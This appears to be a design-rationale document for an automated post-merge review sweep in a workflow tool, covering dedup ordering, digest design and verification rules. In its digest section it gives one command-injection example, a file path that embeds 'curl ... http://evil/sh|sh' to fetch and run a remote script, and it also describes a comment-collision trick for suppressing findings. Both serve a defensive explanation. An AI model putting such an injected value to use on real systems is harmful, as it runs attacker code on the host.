# closeout-review — rationale (read by authors, never at slot-fire)

The paired reference for [`../fragments/closeout-review.md`](../fragments/closeout-review.md). The
fragment carries only behaviour; everything that explains *why* it is shaped that way lives here and
is never read at runtime.

---

## The incident

The C029 fleet run (WF-480) shipped 21 pull requests unattended. The capped-review rule held — no
run waited indefinitely on a reviewer — but across eight of those pull requests (#277, #278, #280,
#283, #287, #291, #293, #296) the automated reviewer's verdict landed *minutes after* the caps
expired and the merge completed. Nothing in the pipeline revisits a merged pull request, so those
verdicts sat unread until a manual sweep filed WF-503–WF-506, which in turn surfaced one confirmed
contract bug, one confirmed hardening gap, and a behavioural escalation (WF-521).

The instances were symptoms. The mechanism is the gap: **feedback that arrives after ceremony is
systematically orphaned**, and no amount of tuning the caps closes it, because the caps are correct.
WF-490/WF-491 established that receipts prove a ceremony *ran*; this sweep closes the sibling gap of
what arrives *after* one.

## Why a fragment with two callers, and not two skills

The sweep has two natural attachment points — a fleet run's Closeout, over the whole merged set, and
a standalone invocation for a single already-shipped task. Writing it twice would guarantee drift:
the two copies would diverge on the disposition vocabulary first and the verification discipline
second, and the second divergence is the one that launders reviewer noise into the tracker.

So the procedure is written **once**, as this capability's fragment, and both call sites follow it.
The fleet side reaches it through the `fleet.closeout-review` slot (`replace`) — composition through
the registry, so core `fleet` names no review term and runs entirely inert when this capability is
not registered. The standalone side reaches it by resolving the same fragment directly. Neither
holds a copy.

This mirrors the architecture WF-331 established for `ship.review`, deliberately: a reader who knows
one knows the other.

## Post-merge thread reachability — the analysis behind Step 1

`review-threads-read` scopes its results to the pull request's head commit, dropping any thread
anchored to a superseded commit. That raises two separate questions post-merge, and conflating them
is the trap.

**The head-commit scoping is correct, unchanged, after a merge.** A pull request's head ref is the
final commit on its source branch. Merging does not move it, and `wf` never force-pushes or rewrites
a branch after opening its pull request. A host anchors every inline comment — including one filed
after the merge, from the pull request's own file view — to that same final commit, because a merged
pull request's diff is always presented against its actual head rather than against an intermediate,
already-superseded commit. So a thread the read would have dropped as stale *before* the merge is
exactly as correctly stale *after* it. Nothing about this filter needed changing, and the fragment
consumes the read's output unmodified.

**The real gap is reachability once the source branch is gone.** The read resolves its input through
the host's pull-request lookup. `wf` itself deletes no branch — `/wf:tf` sweeps only scratch, and
`/wf:fleet`'s Closeout *lists* undeleted branches for manual cleanup rather than removing them — but
a repository's own auto-delete-on-merge setting can remove one regardless. Then a branch name
resolves nothing.

That is a **caller-side identity problem, not a contract gap**. The host's lookup takes a pull
request number or URL in the very same positional input it takes a branch name, and
`review-threads-read`'s contract never asserts that its input *looks like* a branch. Both call sites
already hold a durable non-branch identity by the time they sweep: the fleet scoreboard's own `PR`
column, persisted per row through the merged run, and — for a finalized task — the merged-pull-request
reference `/wf:tf` records at finalize time. So the fragment tries the branch first (cheapest, and
usually still there) and falls back to the recorded reference.

### Why the fallback needs a probe, and cannot key off the reads

The first cut of this fragment triggered the fallback when the branch "resolved no pull request".
That condition is not observable, and the fallback it guarded was therefore dead code.

`review-threads-read` types a pull request the host cannot find **exactly** as it types one that
simply has nothing to say: `<read-performed>` true with an empty `<threads>` set. `pr-comments-read`
does the same, returning a valid empty list. Neither emits a "no such pull request" signal at all.
So a fallback gated on that condition never fires on the branch-deleted pull request it exists to
rescue — while that pull request instead lands on the empty-review path and is recorded
`absent: no review present at read time`. A merged pull request carrying live post-merge findings
would have reported as a quiet one: the exact false-clean this whole task exists to end, reproduced
inside the mechanism built to fix it.

`pr-detect` is the operation that answers the question the reads cannot. It returns a typed
`<found>` boolean, and a merged pull request still resolves through it as long as the identity it is
handed exists. So Step 1 **probes first and reads second**, and Step 2's honest zero is gated on
the identity search having **terminated** — its probe found an identity, or every held identity
was tried and none resolved. Step 1 stops at the first identity that resolves, so the ordinary case
(the branch probe succeeds while `<pr-ref>` is also held but never needed) satisfies the gate
without probing further. The ordering is the safeguard: an empty result reached *before* the search
terminates says nothing about the review, only that one identity found nothing.

**No new delivery operation is added.** `pr-detect` is already on the surface (`/wf:fleet` consumes
it at OBSERVE today), and passing a pull-request reference into the reads' existing `<branch>` input
is a different *value* flowing into an existing input. That is why the task's own scope line ruling
out new contract operations is satisfied rather than escalated. Only when the probe finds nothing
for *either* identity does the pull request become `absent: PR unreachable`, with that stated reason
— never silently skipped, never folded into `moot`, and never collapsed into the empty-review
reason beside it.

## Why five dispositions, and why `absent` is not `moot`

Three of the five say something about a **candidate finding** that was read and judged: it holds
(`issue filed`), it does not hold (`verified-invalid`), or it held once and no longer does (`moot`).

`absent` says something about the **review** instead: there was nothing to judge, because the read
could not be performed, the pull request could not be reached, or the review genuinely produced
nothing by read time. Folding it into `moot` would report an unread pull request as a clean one —
the precise failure mode this whole task exists to end, reproduced inside the mechanism meant to fix
it. The success criterion "absence is recorded as absence, not as clean" is this distinction.

`unverifiable` says something about a candidate the source could never answer for — no anchor, an
anchor the containment bound rejected, a file that no longer opens, or a source that could not be
read. It is separate from
`verified-invalid` because that token asserts *the source was read and the claim does not hold*, a
factual claim about code; wearing it on a candidate nobody opened would record a verdict nobody
reached.

The tally reflects the same split: `<survivors> + <invalid> + <moot> + <unverifiable>` equals
`<found>` — every disposition a *candidate* can take is inside the sum — and two counts sit apart
from that sum: `<absent>` (the review produced nothing to judge) and `<not-judged>` (items the run never
judged at all, each with a stated reason: past the ingest cap Step 2 applies, past the candidate cap
Step 3 applies, or the distiller returned no block for it).

## Why the two dedup comparisons sit on opposite sides of the ingest cap

Step 2 runs cross-source dedup, then the cap, then within-source dedup. That looks fussy and is not:
each comparison is pinned by a different failure, and the two failures pull in opposite directions.

**Cross-source must come first** because `pr-comments-read` is a superset that re-returns every
thread's own anchoring comment. Across the two reads, *every* thread is therefore present twice. Cap
first and each thread costs two of the 100 slots — real capacity halves to ~50 distinct comments,
and the surplus pushed into `<not-judged>` is made of a thread's own duplicates. Since a non-zero
`<not-judged>` bars the clean token at every caller, a pull request whose every distinct comment was
read and judged would report itself incomplete. The comparison is free to hoist: it mints no digest,
and both reads' output is already in the caller's context by the time it runs.

**Within-source must come last** because it mints a digest per entry it examines. Hoisting it above
the cap would put digest minting on an unbounded, attacker-controlled set — a pull request anyone
can comment on. Leaving it below is what makes each caller's "at most one digest per entry in the
100-entry ingest" grant an exact upper bound instead of an aspiration.

The residual cost is a duplicate inside the first 100 displacing a genuine entry past the cap. That
is capacity, not silence: the displaced entry is counted with a stated reason. Trading a reported
shortfall for unbounded digest minting would be the worse deal, so the ordering stands.

**The interleave is a separate fix with a separate failure.** Ordering the ingest threads-first
would let 25 review threads exhaust the 25-candidate budget before a single pull-request-level or
review-summary comment is reached — and that anchorless class is the shape an automated reviewer's
post-merge verdict usually arrives in. The finding the whole procedure exists to catch would be
counted `past the candidate cap` on any pull request with an ordinary number of threads: not a false
clean (the run renders `Partial`), but the target finding discarded all the same. Alternating
between the two sources guarantees each at least half of each budget while both have entries left.

## Why the `<key>` digest is over the raw body, and minted before the truncation

The retention truncation and the idempotency key were added in the same round, and the first cut got
their interaction wrong in both available ways before landing.

The truncation exists because both reads are unpaginated: a commenter can post arbitrarily large
bodies. Truncating what is *retained* bounds every byte carried forward — into the distiller prompt,
the digest preimage, the filed quote. It does **not** bound the read's own cost; that result has
already landed whole in the caller's context and stays in the transcript. Saying otherwise would be
the kind of false mitigation this whole procedure exists to stop, so the fragment says plainly what
the bound does and does not cover, and the real fix is the escalation for a caller-supplied result
limit.

Once bodies are truncated, "the raw body" and "the body the caller holds" are two byte strings, and
the digest has to name one. **Naming the truncated copy is the wrong answer, and not merely for
tidiness — it is exploitable.** Keys over a 4000-character prefix collide on any two comments sharing
an anchor and that prefix. An attacker who can read a long genuine finding can post a copy of its
first 4000 characters; the two share a `<key>`; the within-source dedup drops one as a duplicate —
into no counter, since a dedup drop is by definition "a duplicate of an item that is accounted for"
— and the run still renders its clean token. Every anchorless comment shares the empty-string anchor,
so the whole pull-request-level class, the one an automated reviewer's verdict usually lands in,
sits in a single collision namespace. That is a suppression primitive against the exact finding the
sweep was built to catch.

So the digest is over the **raw** body, and Step 2 mints it at retention time — before its own
truncation — which is what keeps the raw bytes available at the one moment they are needed. Digest
count is unchanged (the retained set is already capped at 100), determinism is unchanged (the body
as read does not vary between runs), and Step 3's own wording, which always said "raw body as read
in Step 2", becomes true rather than a contradiction to be reconciled.

The preimage is written to `_local/scratch/` and hashed there for a separate reason: it is arbitrary
attacker-authored text, and a shell interpolating it would execute it. The same reasoning gives the
anchor a character allowlist checked *before* any `Bash` call — the real-path resolution puts an
untrusted path on a command line, and the three shape conditions (relative, `..`-free, inside the
root) exclude no metacharacter at all. `src/x$(curl -s http://evil/sh|sh).ts` satisfies every one of
them.

## Why the dedup needs both halves, and why anchor-only is worse than none

Without any dedup each thread's anchoring comment is judged **twice** — once keyed by its thread node
id, once from the comment list — consuming two candidate slots and two filing slots, inflating
`<found>`, and defeating idempotency because the two copies key differently.

But matching on the `path`:`line` **anchor alone** is worse than not deduplicating at all.
`review-threads-read` returns only each thread's *first* comment (`comments(first:1)`), so every
**reply** shares its thread's anchor. An anchor-only match drops them all — silently, outside
`<found>` and outside `<not-judged>`. A reply is very often *the* late-landing verdict this sweep
exists to catch, so that rule would defeat the whole procedure while reporting a clean tally. Hence
anchor **and** body, and hence the two comparisons rather than one.

## Why the interleave, and what threads-first would cost

Ordering the ingest threads-first would let 25 review threads exhaust the 25-candidate budget before
a single pull-request-level or review-summary comment is reached. That anchorless class is exactly
the shape an automated reviewer's post-merge verdict usually arrives in — so the finding the whole
procedure exists to catch would be counted `past the candidate cap` on any pull request with an
ordinary number of threads. Not a false clean (the run renders `Partial`), but the target finding
discarded all the same. Alternating guarantees each source at least half of each budget while both
have entries left, and the whole of it when one is empty.

## The capacity cost of ordering the within-source dedup after the cap

A within-source duplicate sitting inside the first 100 consumes a slot, so a genuine entry beyond the
cap is counted `past the ingest cap` in its place. That is a **capacity** effect, correctly reported
— the shortfall shows up as a non-zero `<not-judged>`, never as a silent drop. Reclaiming the slot by
running that comparison before the cap would trade a reported shortfall for unbounded digest minting
on an attacker-controlled surface, which is the worse of the two. The cross-source comparison has no
such trade-off, which is why only it moves ahead of the cap.

## Why `unverifiable` is a separate disposition from `verified-invalid`

`verified-invalid` asserts *the source was read and the claim does not hold* — a factual claim about
code. Applying it to a candidate whose source was never opened would record a verdict nobody reached:
the same laundering-by-mislabel the procedure forbids at the tracker. `unverifiable` is still a
disposition a candidate *takes*, so it sits inside `<found>` with the other three — but a run whose
candidates were all `unverifiable` has verified nothing, which is why the clean gate tests it
separately.

## Why the filing cap is per pull request and not sweep-wide

A sweep-wide bound was considered and dropped. The procedure executes once per pull request, so
enforcing one would need the caller to carry a running total across invocations — machinery whose own
failure modes (counting earlier runs' writes, permanently suppressing new filings) cost more than the
bound was worth. The per-pull-request cap already stops one noisy pull request from flooding a
tracker, which is what it was for.

The `<already-filed>` skip is applied *before* the cap for a related reason: a survivor filed on an
earlier run produces no tracker write, so counting it would let a re-run push a genuinely new
survivor past the cap permanently — the record meant to prevent duplicates would instead suppress
first-time filings.

## Why the distiller dispatch is unconditional

A "judge the small ones inline" shortcut would leave a non-empty ingest that raises no claim in no
bucket at all: `<found>` zero, `<not-judged>` zero, the clean `absent` reason barred because a review
*was* present, and every clean gate satisfied. That is the exact silent loss the `NOTHING ACTIONABLE`
split exists to close, reopened on the other path. One dispatch per pull request is cheap; a
discarded review is not.

## Why Step 3 tags the anchor and not just the source id

The distiller echoes back whatever the input carried. Tagging the id alone would make every returned
block read `Anchor: none` and push every anchored candidate down the anchorless branch, where the
procedure re-derives an anchor from untrusted claim text.

## Why the surgery: this file exists so the fragment can stay short

The fragment is read at slot-fire, in the caller's own context, **once per swept pull request**. On a
fleet run over 21 merged rows, every line of it is paid 21 times — in the orchestrator that also
holds the scoreboard and every in-flight row. So a paragraph that argues for a rule, rather than
stating it, is a runtime cost with no runtime effect.

That is not how this file was built. Across 26 audit rounds the fragment grew 181 → 696 lines, almost
all of it justification written *in place* at the moment each finding was answered — the natural
instinct, and the wrong one, because each such paragraph is locally reasonable and collectively a
context tax on the very resource the procedure's own bounds exist to protect. A later pass moved that
reasoning here, where it belongs, and left the fragment stating what to do.

**The rule for anyone editing either file:** if removing a sentence from the fragment leaves a
plausible-but-wrong next action, it is behaviour and it stays. If it only leaves a reader less
convinced, it is rationale and it belongs here.

## Why verify-before-file is non-negotiable

The C029 manual triage dropped roughly 60% of the reviewer's post-merge claims against the real
code. A sweep that filed candidates unverified would have created a tracker full of noise and taught
every reader to ignore it — strictly worse than the silence it replaced. So a candidate becomes an
issue only after current source has been opened at the anchor it names and confirms it, and the
filed issue carries that evidence so a reader can re-check it without re-deriving it.

Current source, not the merged diff, is the authority here: between the review landing and the sweep
running, another merge may already have fixed the thing. That case is `moot`, and it is only
distinguishable by reading the code as it stands.

## Why the sweep fixes nothing

Remediation is a gated, plan-then-implement flow with a human in it. A sweep that also fixed would
be an unattended source-mutating step keyed off untrusted review output — the same shape the `ship`
Phase-4.2 write-target test exists to bound, but without a bound. So the sweep reads, verifies, and
files; the filed issues carry the remediation.

## The unfiled reason: why it is stated, not enumerated

An earlier revision closed the `<unfiled>` reason set at six tokens and derived a guard oracle from
the procedure's own enumeration to police membership at every site. Both are gone, deliberately.

The closed set was answering a real question — *is any survivor left with no reason?* — with a
mechanism far larger than the question. Six tokens across five sites is thirty places a repair can
fall behind, and it fell behind in four consecutive audit rounds — for example a token added to the procedure
but not the render sites, a count claimed as four while five were listed, a fixture still asserting
the old size. Every one of those was drift in machinery that existed only to police machinery.

`00_reqs` never asked for a closed vocabulary. It asked that no finding be left silent. So the
obligation is now the question itself: **an unfiled survivor carries a stated reason, in the
author's own words, and its full evidence, and every render site has somewhere to put them.** The
guard checks exactly that. The known reasons — no tracker registered, no filing parent resolved,
filing cap reached, filing failed, not filed on a dry run, already filed on an earlier run — are
documented as *examples* wherever they appear, never as an exhaustive set a site must mirror.

The same reasoning retired two counters. `<triaged>` and `<unjudged>` were two numbers for one fact
("this run did not judge it"), each needing its own gloss at four sites; they are one `<not-judged>`
with a stated reason. And `<unverifiable>` moved inside the `<found>` sum, where it belongs — it is
a disposition a candidate takes, not a reason one was never reached.

**The general lesson, recorded because it cost several rounds to learn:** answering an audit finding
by adding specification creates new cross-site surface, and the next audit finds drift in the
surface just created. Where a finding can be answered by *removing* a distinction instead, that is
the cheaper repair and the one that actually converges.
